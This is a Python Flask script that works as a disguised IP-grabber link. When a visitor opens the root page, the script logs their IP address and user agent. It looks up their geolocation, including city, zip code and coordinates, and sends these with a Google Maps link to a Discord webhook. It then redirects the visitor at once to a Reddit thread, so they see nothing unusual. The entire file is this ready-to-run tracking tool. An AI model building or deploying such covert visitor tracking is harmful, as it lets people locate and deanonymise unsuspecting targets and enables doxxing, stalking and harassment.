import requests
from flask import Flask, request, redirect
from datetime import datetime
import os

app = Flask(__name__)

# Make sure the webhook URL is set correctly
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN")

logged_ips = set()

def get_real_ip():
    """Extract the real IP address from the request"""
    xff = request.headers.get("X-Forwarded-For", "")
    ip = xff.split(",")[0].strip() if xff else request.remote_addr
    return ip

def get_visitor_info(ip, user_agent):
    """Get geolocation information based on IP"""
    try:
        # Request data from ipapi or any other geolocation service
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Status Code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Error: {e}")

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "XX").lower(),
        "region": details.get("region", "Unknown"),
        "city": details.get("city", "Unknown"),
        "zip": details.get("postal", "Unknown"),
        "lat": details.get("latitude", 0),
        "lon": details.get("longitude", 0),
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send the information to the Discord webhook"""
    embed = {
        "username": "Visitor Bot",
        "embeds": [{
            "title": f"🌍 Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": f"{info['ip']} ({info['city']})", "inline": True},
                {"name": "User Agent", "value": info["user_agent"], "inline": False},
                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {
                "text": f"Time (GMT): {info['date']} {info['time']}",
                "icon_url": "https://example.com/alarm-clock-icon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
    print(f"Discord webhook response: {response.status_code}")

@app.route('/')
def index():
    """Main route that handles the incoming request"""
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Only log the IP and send to Discord if it's not already logged
    if ip not in logged_ips:
        logged_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)

    # Redirect the user instantly to the Reddit page
    return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
